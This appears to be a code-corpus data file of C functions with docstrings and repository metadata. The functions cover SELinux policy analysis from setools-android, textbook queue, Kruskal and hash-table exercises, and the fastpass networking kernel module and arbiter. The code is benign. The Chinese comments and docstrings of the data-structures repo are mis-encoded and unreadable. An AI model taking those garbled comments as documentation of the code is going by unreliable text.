{"docstring": "/**\n * Given a vector of apol_domain_trans_result_t objects, deep copy to\n * the results vector those domain transition results whose target\n * type matches target_name (or any of target_name's attributes or\n * aliases).\n *\n * @param p Policy within which to lookup types.\n * @param v Vector of existing apol_domain_trans_result_t.\n * @param target_name Target type name.\n * @param results Vector to which clone matching domain transition\n * results.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_clone_domaintrans(const apol_policy_t * p, const apol_vector_t * v, const char *target_name,\n\t\t\t\t\t\t apol_vector_t * results)", "code": "{\n\tapol_vector_t *candidate_types = NULL;\n\tconst qpol_type_t *target;\n\tapol_domain_trans_result_t *res, *new_res;\n\tsize_t i, j;\n\tint retval = -1;\n\tif ((candidate_types = apol_query_create_candidate_type_list(p, target_name, 0, 1, APOL_QUERY_SYMBOL_IS_BOTH)) == NULL) {\n\t\tgoto cleanup;\n\t}\n\tfor (i = 0; i < apol_vector_get_size(v); i++) {\n\t\tres = (apol_domain_trans_result_t *) apol_vector_get_element(v, i);\n\t\ttarget = apol_domain_trans_result_get_end_type(res);\n\t\tif (apol_vector_get_index(candidate_types, target, NULL, NULL, &j) == 0) {\n\t\t\tif ((new_res = apol_domain_trans_result_create_from_domain_trans_result(res)) == NULL ||\n\t\t\t    apol_vector_append(results, new_res) < 0) {\n\t\t\t\tdomain_trans_result_free(new_res);\n\t\t\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\t\t}\n\t}\n\tretval = 0;\n      cleanup:\n\tapol_vector_destroy(&candidate_types);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/*************** functions to access type relation results ***************/\n", "func_signal": "void apol_types_relation_result_destroy(apol_types_relation_result_t ** result)", "code": "{\n\tif (*result != NULL) {\n\t\tapol_vector_destroy(&(*result)->attribs);\n\t\tapol_vector_destroy(&(*result)->roles);\n\t\tapol_vector_destroy(&(*result)->users);\n\t\tapol_vector_destroy(&(*result)->simA);\n\t\tapol_vector_destroy(&(*result)->simB);\n\t\tapol_vector_destroy(&(*result)->disA);\n\t\tapol_vector_destroy(&(*result)->disB);\n\t\tapol_vector_destroy(&(*result)->allows);\n\t\tapol_vector_destroy(&(*result)->types);\n\t\tapol_vector_destroy(&(*result)->dirflows);\n\t\tapol_vector_destroy(&(*result)->transAB);\n\t\tapol_vector_destroy(&(*result)->transBA);\n\t\tapol_vector_destroy(&(*result)->domsAB);\n\t\tapol_vector_destroy(&(*result)->domsBA);\n\t\tfree(*result);\n\t\t*result = NULL;\n\t}\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Adds a rule to a vector of apol_types_relation_access_t pointers.\n * Expands the rule's target type, appending new entries as necessary.\n *\n * @param p Policy from which rule originated.\n * @param r Rule to expand and append.\n * @param access Vector of apol_types_relation_access_t.\n *\n * @return 0 on success, < 0 on error.\n */\n", "func_signal": "static int apol_types_relation_access_append_rule(const apol_policy_t * p, const qpol_avrule_t * r, apol_vector_t * access)", "code": "{\n\tconst qpol_type_t *t;\n\tapol_vector_t *expanded = NULL;\n\tsize_t i, j;\n\tapol_types_relation_access_t *a;\n\tint retval = -1;\n\tif (qpol_avrule_get_target_type(p->p, r, &t) < 0 || (expanded = apol_query_expand_type(p, t)) == NULL) {\n\t\tgoto cleanup;\n\t}\n\tfor (i = 0; i < apol_vector_get_size(expanded); i++) {\n\t\tt = apol_vector_get_element(expanded, i);\n\t\tif (apol_vector_get_index(access, t, apol_types_relation_access_compfunc, NULL, &j) == 0) {\n\t\t\ta = (apol_types_relation_access_t *) apol_vector_get_element(access, j);\n\t\t} else {\n\t\t\tif ((a = calloc(1, sizeof(*a))) == NULL ||\n\t\t\t    (a->rules = apol_vector_create(NULL)) == NULL || apol_vector_append(access, a) < 0) {\n\t\t\t\tERR(p, \"%s\", strerror(errno));\n\t\t\t\tapol_types_relation_access_free(a);\n\t\t\t\tgoto cleanup;\n\t\t\t}\n\t\t\ta->type = t;\n\t\t}\n\t\tif (apol_vector_append(a->rules, (void *)r) < 0) {\n\t\t\tERR(p, \"%s\", strerror(ENOMEM));\n\t\t\tgoto cleanup;\n\t\t}\n\t}\n\tretval = 0;\n      cleanup:\n\tapol_vector_destroy(&expanded);\n\treturn retval;\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/**\n * Deallocate all space associated with a types relation access node,\n * including the pointer itself.  Does nothing if the pointer is\n * alread NULL.\n *\n * @param data Pointer to an access node to free.\n */\n", "func_signal": "static void apol_types_relation_access_free(void *data)", "code": "{\n\tapol_types_relation_access_t *a = (apol_types_relation_access_t *) data;\n\tif (a != NULL) {\n\t\tapol_vector_destroy(&a->rules);\n\t\tfree(a);\n\t}\n}", "path": "jni\\libapol\\types-relation-analysis.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/***************************** syn_avule functions ****************************/\n", "func_signal": "int qpol_syn_avrule_get_rule_type(const qpol_policy_t * policy, const qpol_syn_avrule_t * rule, uint32_t * rule_type)", "code": "{\n\tavrule_t *internal_rule = NULL;\n\n\tif (rule_type)\n\t\t*rule_type = 0;\n\n\tif (!policy || !rule || !rule_type) {\n\t\tERR(policy, \"%s\", strerror(EINVAL));\n\t\terrno = EINVAL;\n\t\treturn STATUS_ERR;\n\t}\n\n\tinternal_rule = ((struct qpol_syn_rule *)rule)->rule;\n\n\tif (internal_rule->specified == AVRULE_DONTAUDIT)\n\t\t*rule_type = QPOL_RULE_DONTAUDIT;\n\telse\n\t\t*rule_type = internal_rule->specified;\n\n\treturn STATUS_SUCCESS;\n}", "path": "jni\\libqpol\\syn_rule_query.c", "repo_name": "xmikos/setools-android", "stars": 223, "license": "other", "language": "c", "size": 877}
{"docstring": "/* Q\u03aa\u0576 */\n", "func_signal": "Status ClearQueue(LinkQueue *Q)", "code": "{\n\tQueuePtr p,q;\n\tQ->rear=Q->front;\n\tp=Q->front->next;\n\tQ->front->next=NULL;\n\twhile(p)\n\t{\n\t\t q=p;\n\t\t p=p->next;\n\t\t free(q);\n\t}\n\treturn OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\06\u94fe\u961f\u5217_LinkQueue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* Q\u03aa\u0576,\uda9f\udd7bTRUE,\uda9f\udd7bFALSE */\n", "func_signal": "Status QueueEmpty(SqQueue Q)", "code": "{ \n\tif(Q.front==Q.rear) /* \u043f\u0575\u0131\u05be */\n\t\treturn TRUE;\n\telse\n\t\treturn FALSE;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\05\u987a\u5e8f\u961f\u5217_Queue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u037c */\n", "func_signal": "void CreateMGraph(MGraph *G)", "code": "{\n\tint i, j;\n\n\t/* printf(\"\u0376:\"); */\n\tG->numEdges=15;\n\tG->numVertexes=9;\n\n\tfor (i = 0; i < G->numVertexes; i++)/* \u02bc\u037c */\n\t{\n\t\tfor ( j = 0; j < G->numVertexes; j++)\n\t\t{\n\t\t\tif (i==j)\n\t\t\t\tG->arc[i][j]=0;\n\t\t\telse\n\t\t\t\tG->arc[i][j] = G->arc[j][i] = INFINITY;\n\t\t}\n\t}\n\n\tG->arc[0][1]=10;\n\tG->arc[0][5]=11; \n\tG->arc[1][2]=18; \n\tG->arc[1][8]=12; \n\tG->arc[1][6]=16; \n\tG->arc[2][8]=8; \n\tG->arc[2][3]=22; \n\tG->arc[3][8]=21; \n\tG->arc[3][6]=24; \n\tG->arc[3][7]=16;\n\tG->arc[3][4]=20;\n\tG->arc[4][7]=7; \n\tG->arc[4][5]=26; \n\tG->arc[5][6]=17; \n\tG->arc[6][7]=19; \n\n\tfor(i = 0; i < G->numVertexes; i++)\n\t{\n\t\tfor(j = i; j < G->numVertexes; j++)\n\t\t{\n\t\t\tG->arc[j][i] =G->arc[i][j];\n\t\t}\n\t}\n\n}", "path": "\u7b2c7\u7ae0\u56fe\\06\u6700\u5c0f\u751f\u6210\u6811_Kruskal.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* Q\u03aa\u0576 */\n", "func_signal": "Status ClearQueue(SqQueue *Q)", "code": "{\n\tQ->front=Q->rear=0;\n\treturn OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\05\u987a\u5e8f\u961f\u5217_Queue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0432,eQ\u0136\u0377\u052a,OK,\uda9f\udd7bERROR */\n", "func_signal": "Status GetHead(SqQueue Q,QElemType *e)", "code": "{\n\tif(Q.front==Q.rear) /* \u043f */\n\t\treturn ERROR;\n\t*e=Q.data[Q.front];\n\treturn OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\05\u987a\u5e8f\u961f\u5217_Queue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0435\u0133 */\n", "func_signal": "int QueueLength(LinkQueue Q)", "code": "{ \n\tint i=0;\n\tQueuePtr p;\n\tp=Q.front;\n\twhile(Q.rear!=p)\n\t{\n\t\t i++;\n\t\t p=p->next;\n\t}\n\treturn i;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\06\u94fe\u961f\u5217_LinkQueue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u04bb\u0576Q */\n", "func_signal": "Status InitQueue(LinkQueue *Q)", "code": "{ \n\tQ->front=Q->rear=(QueuePtr)malloc(sizeof(QNode));\n\tif(!Q->front)\n\t\texit(OVERFLOW);\n\tQ->front->next=NULL;\n\treturn OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\06\u94fe\u961f\u5217_LinkQueue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u07f6\u03b2\u00b1 */\n", "func_signal": "int Find(int *parent, int f)", "code": "{\n\twhile ( parent[f] > 0)\n\t{\n\t\tf = parent[f];\n\t}\n\treturn f;\n}", "path": "\u7b2c7\u7ae0\u56fe\\06\u6700\u5c0f\u751f\u6210\u6811_Kruskal.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0228\u05b5 \u053c\u0377\u03b2 */\n", "func_signal": "void Swapn(Edge *edges,int i, int j)", "code": "{\n\tint temp;\n\ttemp = edges[i].begin;\n\tedges[i].begin = edges[j].begin;\n\tedges[j].begin = temp;\n\ttemp = edges[i].end;\n\tedges[i].end = edges[j].end;\n\tedges[j].end = temp;\n\ttemp = edges[i].weight;\n\tedges[i].weight = edges[j].weight;\n\tedges[j].weight = temp;\n}", "path": "\u7b2c7\u7ae0\u56fe\\06\u6700\u5c0f\u751f\u6210\u6811_Kruskal.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0432,\u027eQ\u0136\u0377\u052a,e\u05b5,OK,\uda9f\udd7bERROR */\n", "func_signal": "Status DeQueue(LinkQueue *Q,QElemType *e)", "code": "{\n\tQueuePtr p;\n\tif(Q->front==Q->rear)\n\t\treturn ERROR;\n\tp=Q->front->next;\t\t/* \u027e\u0136\u0377\u0774p\u037c\u0422 */\n\t*e=p->data;\t\t\t\t/* \u027e\u0136\u0377\u05b5\u05b5e */\n\tQ->front->next=p->next;/* \u052d\u0377\u013ap->next\u05b5\u0377\u0323\u037c\u0422 */\n\tif(Q->rear==p)\t\t/* \u0377\u01f6\u03b2\u027erear\u05b8\u0377\u38ec\u037c\u0422 */\n\t\tQ->rear=Q->front;\n\tfree(p);\n\treturn OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\06\u94fe\u961f\u5217_LinkQueue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0676Q */\n", "func_signal": "Status DestroyQueue(LinkQueue *Q)", "code": "{\n\twhile(Q->front)\n\t{\n\t\t Q->rear=Q->front->next;\n\t\t free(Q->front);\n\t\t Q->front=Q->rear;\n\t}\n\treturn OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\06\u94fe\u961f\u5217_LinkQueue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u063c\u05bd\u0262\u0431 */\n", "func_signal": "void InsertHash(HashTable *H,int key)", "code": "{\n\tint addr = Hash(key); /* \u0262\u0435\u05b7 */\n\twhile (H->elem[addr] != NULLKEY) /* \u03aa\u0563\u037b */\n\t{\n\t\taddr = (addr+1) % m; /* \u0176\u05b7\u033d */\n\t}\n\tH->elem[addr] = key; /* \u05b1\u043f\u03bb\u063c */\n}", "path": "\u7b2c8\u7ae0\u67e5\u627e\\05\u6563\u5217\u8868_HashTable.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0228\u05b5 */\n", "func_signal": "void sort(Edge edges[],MGraph *G)", "code": "{\n\tint i, j;\n\tfor ( i = 0; i < G->numEdges; i++)\n\t{\n\t\tfor ( j = i + 1; j < G->numEdges; j++)\n\t\t{\n\t\t\tif (edges[i].weight > edges[j].weight)\n\t\t\t{\n\t\t\t\tSwapn(edges, i, j);\n\t\t\t}\n\t\t}\n\t}\n\tprintf(\"\u0228\u05ae\u03aa:\\n\");\n\tfor (i = 0; i < G->numEdges; i++)\n\t{\n\t\tprintf(\"(%d, %d) %d\\n\", edges[i].begin, edges[i].end, edges[i].weight);\n\t}\n\n}", "path": "\u7b2c7\u7ae0\u56fe\\06\u6700\u5c0f\u751f\u6210\u6811_Kruskal.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u052ae\u03aaQ\u00b5\u0136\u03b2\u052a */\n", "func_signal": "Status EnQueue(LinkQueue *Q,QElemType e)", "code": "{ \n\tQueuePtr s=(QueuePtr)malloc(sizeof(QNode));\n\tif(!s) /* \u6d22\u02a7 */\n\t\texit(OVERFLOW);\n\ts->data=e;\n\ts->next=NULL;\n\tQ->rear->next=s;\t/* \u04f5\u052ae\u00bds\u05b5\u052d\u03b2\u013a\u0323\u037c\u0422 */\n\tQ->rear=s;\t\t/* \u0475\u01f0s\u03aa\u03b2\u38ecrear\u05b8s\u037c\u0422 */\n\treturn OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\06\u94fe\u961f\u5217_LinkQueue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0421 */\n", "func_signal": "void MiniSpanTree_Kruskal(MGraph G)", "code": "{\n\tint i, j, n, m;\n\tint k = 0;\n\tint parent[MAXVEX];/* \u04bb\u0436\u03f1\u01f7\u03b3\u027b\u00b7 */\n\t\n\tEdge edges[MAXEDGE];/* \u07fc,edge\u013d\u1e79\u03aabegin,end,weight,\u03aa */\n\n\t/* \u07fc\u9ca2********************* */\n\tfor ( i = 0; i < G.numVertexes-1; i++)\n\t{\n\t\tfor (j = i + 1; j < G.numVertexes; j++)\n\t\t{\n\t\t\tif (G.arc[i][j]<INFINITY)\n\t\t\t{\n\t\t\t\tedges[k].begin = i;\n\t\t\t\tedges[k].end = j;\n\t\t\t\tedges[k].weight = G.arc[i][j];\n\t\t\t\tk++;\n\t\t\t}\n\t\t}\n\t}\n\tsort(edges, &G);\n\t/* ******************************************* */\n\n\n\tfor (i = 0; i < G.numVertexes; i++)\n\t\tparent[i] = 0;\t/* \u02bc\u05b5\u03aa0 */\n\n\tprintf(\"\u04e1\u0421\\n\");\n\tfor (i = 0; i < G.numEdges; i++)\t/* \u046d\u00ff\u04bb */\n\t{\n\t\tn = Find(parent,edges[i].begin);\n\t\tm = Find(parent,edges[i].end);\n\t\tif (n != m) /* nm\u0223\u02f5\u02f1\u00fb\u0435\u03b3\u027b\u00b7 */\n\t\t{\n\t\t\tparent[n] = m;\t/* \u02f1\u07f5\u013d\u03b2\u00b1\u03aaparent\u0421 */\n\t\t\t\t\t\t\t/* \u02be\u02f6\u047e */\n\t\t\tprintf(\"(%d, %d) %d\\n\", edges[i].begin, edges[i].end, edges[i].weight);\n\t\t}\n\t}\n}", "path": "\u7b2c7\u7ae0\u56fe\\06\u6700\u5c0f\u751f\u6210\u6811_Kruskal.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0432,eQ\u0136\u0377\u052a,OK,\uda9f\udd7bERROR */\n", "func_signal": "Status GetHead(LinkQueue Q,QElemType *e)", "code": "{ \n\tQueuePtr p;\n\tif(Q.front==Q.rear)\n\t\treturn ERROR;\n\tp=Q.front->next;\n\t*e=p->data;\n\treturn OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\06\u94fe\u961f\u5217_LinkQueue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u03b4\u052ae\u03aaQ\u00b5\u0136\u03b2\u052a */\n", "func_signal": "Status EnQueue(SqQueue *Q,QElemType e)", "code": "{\n\tif ((Q->rear+1)%MAXSIZE == Q->front)\t/* \u0436 */\n\t\treturn ERROR;\n\tQ->data[Q->rear]=e;\t\t\t/* \u052ae\u05b5\u03b2 */\n\tQ->rear=(Q->rear+1)%MAXSIZE;/* rear\u05b8\u04bb\u03bb\u00e3 */\n\t\t\t\t\t\t\t\t/* \u05ea\u0377 */\n\treturn  OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\05\u987a\u5e8f\u961f\u5217_Queue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0432\u0563\u027eQ\u0436\u0377\u052a\u0623e\u05b5 */\n", "func_signal": "Status DeQueue(SqQueue *Q,QElemType *e)", "code": "{\n\tif (Q->front == Q->rear)\t\t\t/* \u043f\u0575\u0436 */\n\t\treturn ERROR;\n\t*e=Q->data[Q->front];\t\t\t\t/* \u0377\u052a\u0638\u05b5e */\n\tQ->front=(Q->front+1)%MAXSIZE;\t/* front\u05b8\u04bb\u03bb\u00e3 */\n\t\t\t\t\t\t\t\t\t/* \u05ea\u0377 */\n\treturn  OK;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\05\u987a\u5e8f\u961f\u5217_Queue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* \u0262\u0431\u04b9\u063c */\n", "func_signal": "Status SearchHash(HashTable H,int key,int *addr)", "code": "{\n\t*addr = Hash(key);  /* \u0262\u0435\u05b7 */\n\twhile(H.elem[*addr] != key) /* \u03aa\u0563\u037b */\n\t{\n\t\t*addr = (*addr+1) % m; /* \u0176\u05b7\u033d */\n\t\tif (H.elem[*addr] == NULLKEY || *addr == Hash(key)) /* \u046d\u0635\u052d */\n\t\t\treturn UNSUCCESS;\t/* \u02f5\u063c\u05b2 */\n\t}\n\treturn SUCCESS;\n}", "path": "\u7b2c8\u7ae0\u67e5\u627e\\05\u6563\u5217\u8868_HashTable.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* Q\u03aa\u0576,\uda9f\udd7bTRUE,\uda9f\udd7bFALSE */\n", "func_signal": "Status QueueEmpty(LinkQueue Q)", "code": "{ \n\tif(Q.front==Q.rear)\n\t\treturn TRUE;\n\telse\n\t\treturn FALSE;\n}", "path": "\u7b2c4\u7ae0\u6808\u4e0e\u961f\u5217\\06\u94fe\u961f\u5217_LinkQueue.c", "repo_name": "YaoGuangyuan/Study-PlayWithDataStruct", "stars": 224, "license": "None", "language": "c", "size": 152}
{"docstring": "/* close the socket */\n", "func_signal": "static void fpproto_close(struct sock *sk, long timeout)", "code": "{\n\tfp_debug(\"visited\\n\");\n\n\tsk_common_release(sk);\n}", "path": "src\\kernel-mod\\fastpass_proto.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Mark the src as allocated.\n */\n", "func_signal": "static inline __attribute__((always_inline))\nvoid mark_src_allocated(struct pim_core_state *core, uint16_t src)", "code": "{\n        uint16_t src_index = PARTITION_IDX(src);\n        core->src_endnodes[PIM_BITMASK_WORD(src_index)] |=\n                (0x1 << PIM_BITMASK_SHIFT(src_index));\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/* disconnect (happens if called connect with AF_UNSPEC family) */\n", "func_signal": "static int fpproto_disconnect(struct sock *sk, int flags)", "code": "{\n\tstruct inet_sock *inet = inet_sk(sk);\n\n\tfp_debug(\"visited\\n\");\n\n\tsk->sk_state = TCP_CLOSE;\n\tinet->inet_daddr = 0;\n\tinet->inet_dport = 0;\n\tsock_rps_reset_rxhash(sk);\n\tsk->sk_bound_dev_if = 0;\n\tif (!(sk->sk_userlocks & SOCK_BINDADDR_LOCK))\n\t\tinet_reset_saddr(sk);\n\n\tif (!(sk->sk_userlocks & SOCK_BINDPORT_LOCK)) {\n\t\tsk->sk_prot->unhash(sk);\n\t\tinet->inet_sport = 0;\n\t}\n\tsk_dst_reset(sk);\n\n\treturn 0;\n}", "path": "src\\kernel-mod\\fastpass_proto.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Flushes the bin for a specific partition to state and allocates a new bin\n */\n", "func_signal": "static inline __attribute__((always_inline))\nvoid _flush_backlog_now(struct pim_state *state, uint16_t partition_index)", "code": "{\n        struct pim_core_state *core = &state->cores[partition_index];\n\n        /* enqueue state->new_demands[partition_index] */\n        while (fp_ring_enqueue(core->q_new_demands,\n                               state->new_demands[partition_index]) == -ENOBUFS)\n                adm_log_wait_for_space_in_q_head(&state->stat);\n\n        /* get a fresh bin for state->new_demands[partition_index] */\n        while (fp_mempool_get(state->bin_mempool,\n                              (void**) &state->new_demands[partition_index]) == -ENOENT)\n                adm_log_new_demands_bin_alloc_failed(&state->stat);\n\n        init_bin(state->new_demands[partition_index]);\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Mark the dst as allocated.\n */\n", "func_signal": "static inline __attribute__((always_inline))\nvoid mark_dst_allocated(struct pim_core_state *core, uint16_t dst)", "code": "{\n        uint16_t dst_index = PARTITION_IDX(dst);\n        core->dst_endnodes[PIM_BITMASK_WORD(dst_index)]\n                |= (0x1 << PIM_BITMASK_SHIFT(dst_index));\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/* configures which qdisc is associated with the fastpass socket */\n", "func_signal": "void fpproto_set_priv(struct sock *sk, void *priv)", "code": "{\n\tstruct fastpass_sock *fp = fastpass_sk(sk);\n\tfp->sch_fastpass_priv = priv;\n}", "path": "src\\kernel-mod\\fastpass_proto.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Increase the backlog from src to dst\n */\n", "func_signal": "void pim_add_backlog(struct pim_state *state, uint16_t src, uint16_t dst,\n                     uint32_t amount)", "code": "{\n        if (backlog_increase(&state->backlog, src, dst, amount,\n                             &state->stat) == false)\n                return; /* no need to enqueue */\n\n        /* add to state->new_demands for the src partition\n         * leave the 'metric' unused */\n        uint16_t partition_index = PARTITION_OF(src);\n        enqueue_bin(state->new_demands[partition_index], src, dst, 0);\n\n        if (bin_size(state->new_demands[partition_index]) == SMALL_BIN_SIZE) {\n                adm_log_backlog_flush_bin_full(&state->stat);\n                _flush_backlog_now(state, partition_index);\n        }\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/* Nanoseconds per operation */\n", "func_signal": "static size_t normalize(const struct timeval *start,\n\t\t\tconst struct timeval *stop,\n\t\t\tunsigned int num)", "code": "{\n\tstruct timeval diff;\n\n\ttimersub(stop, start, &diff);\n\n\t/* Floating point is more accurate here. */\n\treturn (double)(diff.tv_sec * 1000000 + diff.tv_usec)\n\t\t/ num * 1000;\n}", "path": "src\\arbiter\\ccan\\htable\\tools\\hsearchspeed.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * For every destination (right-hand) node in partition 'partition_index',\n *    select among its granted edges which edge to accept. These edges are\n *    added to 'accepts'\n */\n", "func_signal": "void pim_do_accept(struct pim_state *state, uint16_t partition_index)", "code": "{\n        uint16_t count, src_partition;\n        struct ga_edgelist *edgelist;\n\tstruct pim_core_state *core = &state->cores[partition_index];\n        struct admission_core_statistics *core_stat = &core->stat;\n\n#ifndef PIM_SINGLE_ADMISSION_CORE\n        /* indicate that this partition finished its phase */\n        phase_finished(&state->phase, partition_index, core_stat);\n#endif\n\n        /* reset grant adjacency list */\n        ga_reset_adj(&state->grants_by_dst[partition_index]);\n\n        /* sort grants from all src partitions by destination node */\n        struct ga_adj *dest_adj = &state->grants_by_dst[partition_index];\n\n#ifndef PIM_SINGLE_ADMISSION_CORE\n        /* sort grants from this partition first */\n        edgelist = &state->grants.dst[partition_index].src[partition_index];\n        ga_edges_to_adj_by_dst(&edgelist->edge[0], edgelist->n, dest_adj);\n\n        /* sort grants from other partitions, as they are ready */\n        count = 0;\n        while (count < N_PARTITIONS - 1) {\n                src_partition = phase_get_finished_partition(&state->phase, partition_index,\n                                                             core_stat);\n                if (src_partition != NONE_READY) {\n                        count++;\n                        edgelist = &state->grants.dst[partition_index].src[src_partition];\n                        ga_edges_to_adj_by_dst(&edgelist->edge[0], edgelist->n, dest_adj);\n                } else\n                        process_new_requests(state, partition_index);\n        }\n#else\n        for (src_partition = 0; src_partition < N_PARTITIONS; src_partition++) {\n                edgelist = &state->grants.dst[partition_index].src[src_partition];\n                ga_edges_to_adj_by_dst(&edgelist->edge[0], edgelist->n, dest_adj);\n        }\n#endif\n\n        /* for each dst in the partition, randomly choose a src to accept */\n        uint16_t dst;\n        for (dst = first_in_partition(partition_index);\n             dst <= last_in_partition(partition_index);\n             dst++) {\n                uint16_t dst_index = PARTITION_IDX(dst);\n                uint16_t degree = state->grants_by_dst[partition_index].degree[dst_index];\n                if (degree == 0)\n                        continue; /* no grants for this dst */\n\n                /* choose an edge and accept it */\n                uint16_t src_adj_index = ga_rand(&core->rand_state, degree);\n                uint16_t src = state->grants_by_dst[partition_index].neigh[dst_index][src_adj_index];\n                ga_partd_edgelist_add(&state->accepts, src, dst);\n\n                /* mark the dst as allocated for this timeslot */\n                mark_dst_allocated(core, dst);\n        }\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Move demands from 'bin' to requests_by_src\n */\n", "func_signal": "static inline __attribute__((always_inline))\nvoid process_incoming_bin(struct pim_state *state, uint16_t partition_index,\n                          struct bin *bin)", "code": "{\n        uint32_t i;\n        for (i = 0; i < bin_size(bin); i++) {\n                /* add the edge to requests for this partition */\n                struct backlog_edge *edge = bin_get(bin, i);\n                ga_adj_add_edge_by_src(&state->requests_by_src[partition_index],\n                                       PARTITION_IDX(edge->src), edge->dst);\n        }\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
{"docstring": "/**\n * Move new demands from 'q_new_demands' to requests_by_src\n */\n", "func_signal": "static inline __attribute__((always_inline))\nvoid process_new_requests(struct pim_state *state, uint16_t partition_index)", "code": "{\n        struct pim_core_state *core = &state->cores[partition_index];\n        struct bin *bins[RING_DEQUEUE_BURST_SIZE];\n        int n, i;\n        uint32_t num_entries = 0;\n        uint32_t num_bins = 0;\n\n        n = fp_ring_dequeue_burst(core->q_new_demands,\n                                  (void **) &bins[0], RING_DEQUEUE_BURST_SIZE);\n        for (i = 0; i < n; i++) {\n                num_entries += bin_size(bins[i]);\n                num_bins++;\n\n                process_incoming_bin(state, partition_index, bins[i]);\n                fp_mempool_put(state->bin_mempool, bins[i]);\n        }\n        adm_log_processed_new_requests(&state->cores[partition_index].stat,\n\t\t\t\t       num_bins, num_entries);\n}", "path": "src\\grant-accept\\pim.c", "repo_name": "yonch/fastpass", "stars": 151, "license": "other", "language": "c", "size": 1421}
